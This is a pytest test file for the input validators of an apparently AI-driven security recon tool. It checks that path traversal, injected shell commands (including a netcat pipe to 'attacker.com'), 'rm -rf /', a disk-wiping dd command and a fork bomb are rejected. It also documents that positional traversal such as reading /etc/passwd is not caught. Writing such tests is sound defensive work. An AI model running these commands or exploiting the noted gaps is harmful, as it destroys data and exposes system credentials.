"""Tests for input validation module."""

import pytest
from pathlib import Path

from airecon.proxy.agent.validators import (
    validate_target_path,
    validate_command_paths,
    has_dangerous_patterns,
    validate_for_execution,
)


class TestPathValidation:
    """Test path validation functions."""

    def test_valid_workspace_path(self):
        """Valid paths within /workspace should pass."""
        is_valid, result = validate_target_path("target.com", "/workspace")
        assert is_valid is True
        assert isinstance(result, Path)

    def test_valid_nested_path(self):
        """Valid nested paths should pass."""
        is_valid, result = validate_target_path("targets/example.com/output", "/workspace")
        assert is_valid is True
        assert isinstance(result, Path)

    def test_path_traversal_attack(self):
        """Path traversal attempts should be blocked."""
        is_valid, error = validate_target_path("../../../etc/passwd", "/workspace")
        assert is_valid is False
        assert "traversal" in str(error).lower()

    def test_shell_metacharacters(self):
        """Paths with shell metacharacters should be blocked."""
        dangerous_paths = [
            "target.com; cat /etc/passwd",
            "target.com | nc attacker.com",
            "target.com && rm -rf /",
            "target.com`whoami`",
        ]
        
        for path in dangerous_paths:
            is_valid, error = validate_target_path(path, "/workspace")
            assert is_valid is False, f"Should reject: {path}"

    def test_absolute_path_outside_workspace(self):
        """Absolute paths outside workspace should be blocked."""
        is_valid, error = validate_target_path("/etc/passwd", "/workspace")
        assert is_valid is False

    def test_symlink_traversal_blocked(self):
        """Symlink traversal attempts should be blocked."""
        # Create a temporary symlink outside workspace
        is_valid, error = validate_target_path("../workspace_link", "/workspace")
        assert is_valid is False or "../" in str(error).lower()


class TestDangerousPatterns:
    """Test dangerous pattern detection."""

    def test_rm_rf_detection(self):
        """rm -rf / should be detected."""
        has_danger, desc = has_dangerous_patterns("rm -rf /")
        assert has_danger is True

    def test_dd_to_device_detection(self):
        """Writing to /dev should be detected."""
        has_danger, desc = has_dangerous_patterns("dd if=/dev/urandom of=/dev/sda")
        assert has_danger is True

    def test_fork_bomb_detection(self):
        """Fork bomb should be detected."""
        has_danger, desc = has_dangerous_patterns(":() { : | : & }; :")
        assert has_danger is True

    def test_legitimate_commands_safe(self):
        """Legitimate commands should pass."""
        safe_commands = [
            "nmap -sV example.com",
            "nuclei -u http://target -t cves",
            "ffuf -u http://target/FUZZ -w wordlist.txt",
        ]
        
        for cmd in safe_commands:
            has_danger, desc = has_dangerous_patterns(cmd)
            assert has_danger is False, f"Incorrectly flagged: {cmd}"


class TestCommandPathValidation:
    """Test path extraction and validation from commands."""

    def test_extract_output_flag_paths(self):
        """Extract paths after -o flag."""
        is_valid, error = validate_command_paths(
            "nmap -sV example.com -o /workspace/output.txt",
            "/workspace"
        )
        assert is_valid is True

    def test_extract_multiple_paths(self):
        """Extract multiple paths in command."""
        is_valid, error = validate_command_paths(
            "nuclei -u http://target -t /workspace/templates -o /workspace/results.json",
            "/workspace"
        )
        assert is_valid is True

    def test_append_redirect_valid(self):
        """>> append redirect to valid workspace path must pass (regression for >> regex bug)."""
        is_valid, error = validate_command_paths(
            "echo x >> output/log.txt", "/workspace"
        )
        assert is_valid is True, f">> redirect incorrectly rejected: {error}"

    def test_write_redirect_valid(self):
        """Single > redirect to valid workspace path must pass."""
        is_valid, error = validate_command_paths(
            "curl http://target > output/curl.txt", "/workspace"
        )
        assert is_valid is True, f"> redirect incorrectly rejected: {error}"

    def test_reject_redirect_to_escaped_path(self):
        """Reject redirect targets that escape the workspace."""
        is_valid, error = validate_command_paths(
            "cat something > ../../etc/cron.d/evil",
            "/workspace"
        )
        assert is_valid is False

    def test_output_flag_traversal_is_caught(self):
        """Path traversal via -o output flag should be caught."""
        is_valid, error = validate_command_paths(
            "nmap -sV target.com -o ../../etc/passwd",
            "/workspace"
        )
        assert is_valid is False

    def test_positional_path_traversal_not_caught_by_design(self):
        """NOTE: validate_command_paths only inspects known output flags.
        Direct positional args (cat /etc/passwd) are not checked here —
        that protection is in _execute_filesystem_tool via validate_target_path.
        """
        is_valid, _ = validate_command_paths(
            "cat ../../etc/passwd > /workspace/output.txt",
            "/workspace"
        )
        # The output path /workspace/output.txt IS valid — positional arg
        # is not inspected by this function (by design).
        assert is_valid is True


class TestCompleteValidation:
    """Test complete validation pipeline."""

    def test_safe_recon_command(self):
        """Safe recon commands should pass."""
        cmd = "nmap -sV -p 1-1000 target.com"
        is_valid, error = validate_for_execution(cmd)
        assert is_valid is True, f"Error: {error}"

    def test_safe_nuclei_command(self):
        """Safe nuclei commands should pass."""
        cmd = "nuclei -u http://target -t /workspace/templates/cves -o /workspace/output/results.json"
        is_valid, error = validate_for_execution(cmd)
        assert is_valid is True

    def test_reject_dangerous_combined(self):
        """Dangerous patterns should be caught."""
        cmd = "rm -rf /workspace/output && echo 'deleted'"
        is_valid, error = validate_for_execution(cmd)
        assert is_valid is False

    def test_positional_traversal_not_inspected_by_design(self):
        """Positional path args are NOT inspected — known, documented limitation.

        Only flag-referenced paths (-o, >, -t, --targets) are validated.
        Positional args are excluded by design to avoid false positives on
        host/URL arguments (e.g. 'nmap 192.168.1.0/24' has positional IP).
        """
        cmd = "cat /workspace/../../etc/passwd"
        is_valid, error = validate_for_execution(cmd)
        assert is_valid is True
        assert error == ""


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
